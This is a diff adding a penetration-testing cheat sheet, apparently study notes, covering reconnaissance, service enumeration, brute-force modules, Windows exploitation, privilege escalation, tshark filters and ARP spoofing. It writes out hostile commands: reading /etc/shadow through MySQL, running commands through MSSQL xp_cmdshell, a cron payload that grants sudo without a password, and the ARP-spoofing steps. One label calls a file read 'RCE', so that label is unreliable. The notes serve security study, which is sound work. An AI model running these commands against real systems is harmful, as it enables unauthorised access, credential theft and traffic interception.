@@ -1,0 +1,129 @@
+Passive:
+
+host (linux)
+robots.txt (dir)
+sitemap.xml (dir)
+whatweb (linux)
+whois (linux)
+Netcraft (wapp)
+dnsdumpster.com (wapp)
+exploit-db.com (wapp)
+------------------------------------------
+Active:
+
+fierce -dns (linux)
+nmap (linux)
+
+------------------------------------------
+Servizi:
+
+SAMBA:
+	smbmap
+	smbclient
+	rpcclient
+	enum4linux
+	smb_login (msf module to bruteforce)
+	pipe_auditor (msf module to enum pipe)
+
+FTP:
+	ftp-anon (NSE)
+	ftp_login (msf module)
+
+SSH:
+	ssh2-enum-algos (NSE)
+	--script=ssh-auth-methods --script-args="ssh.user=NAME"	(NSE)
+	ssh_login (msf module to bruteforce login)
+HTTP:
+	whatweb (info about http port)
+	http-enum (NSE)
+	http-headers (NSE)
+	http_version (msf module)
+	brute_dirs (msf module like dirb)
+MySQL:
+	mysql_writable_dirs (msf module to check if the dir is writable)
+	mysql_hashdump (msf module to extracts the usernames and encrypted password)
+	mysql-empty-password (NSE)
+	mysql-info (NSE)
+	--script=mysql-users --script-args="mysqluser='root',mysqlpass=''" (NSE enumetation users)
+	--script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" (NSE enumetation DB)
+	--script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" (NSE enumetation var)
+	select load_file("/etc/shadow"); (RCE on server when logged via mysql)
+	mysql_login (msf module to bruteforce login)
+
+MSSQL:
+	ms-sql-info (NSE)
+	--script=ms-sql-ntlm-info --script-args=mssql.instance-port=1433
+	--script=ms-sql-brute --script-args=userdb=DIRUSR,passdb=DIRPASS
+	--script=ms-sql-empty-password
+	--script=ms-sql-dump-hashes --script-args=mssql.username=USER,mssql.password=PASS
+	--script=ms-sql-xp-cmdshell --script-args=mssql.username=USER,mssql.password=PASS,ms-sql-xp-cmdshell.cmd="COMMAND" (RCE)
+	mssql_login (msf module to bruteforce login)
+	mssql_enum (msf module to enum msssql)
+	mssql_enum_sql_logins (msf module)
+	mssql_exec (msf module to RCE)
+	mssql_enum_domain_accounts (msf module)
+------------------------------------------------
+Exploit Windows:
+
+SMB:
+	psexec.py USER@IP (tool to connect via smb)
+
+WinRM:
+	crackmapexec (bruteforce WinRM)
+	evil-winrm.rb -u USER -p 'PASS' -i IP
+
+WebDAV:
+	Supported executable file:
+	.asp
+	.aspx
+	.config
+	.php
+
+	davtest (scan, authenticate and exploit WebDAV server)
+	cadaver (consent to upload, download file from WebDAV server)
+	http-enum (NSE to find WebDAV dir)
+	IP http-get /DIR/ (Hydra command to bruteforce a DIR like vebdav)
+RDP:
+	rdp_scanner (msf module)
+	xfreerdp /u:USER /p:PASS /v:IP (tool to connect to rdp)
+------------------------------------------------
+PRIVESC:
+	
+	suggester (msf module to enumerate lin/win vulnerabilities)
+
+Windows:
+
+Kernel Exploits:
+	Windows-Exploit-Suggester (tool on git to enumerate windows vulnerability)
+
+UAC:
+	bypassuac_eventvwr (msf module to bypass UAC)
+Token Impersonation:
+	SeAssignPrimaryToken, SeCreateToken, SeImpersonatePrivilege are the privileges required for a successful impersonation attack
+	load incognito (meterpreter command)
+	list_tockens -u (list all tokens)
+	impersonate_token "NAME TOKEN"
+
+Linux:
+
+Cron:
+	crontab -l (list all crontabs for the user)
+	printf '#!/bin/bash\necho "USER ALL=NOPASSWD:ALL" >> /etc/sudoers' > PATH_CRONJOB
+SUID:
+	file FILE_NAME
+	strings FILE_NAME (check if run another binary)
+---------------------------------------------------
+Network tool
+
+tshark: (line command like wireshark)
+	tshark -r FILE.pcap -Y "http" (see only http request)
+	tshark -r FILE.pcap -Y "ip.src==IP_SRC && ip.dst==IP_DST"
+	tshark -r FILE.pcap -Y "http.request.method==METHOD"
+	tshark -r FILE.pcap -Y "http.request.method==METHOD" -Tfields -e FIELDS (see only some fields)
+	tshark -r FILE.pcap -Y "http contains password" (see http request with password)
+
+Network attack:
+
+ARP Spoofing:
+	1) echo 1 > /proc/sys/net/ipv4/ip_forward
+	2) arpspoof -i eth1 -t IP_TO_IMPERSONATE -r SWITCH_IP
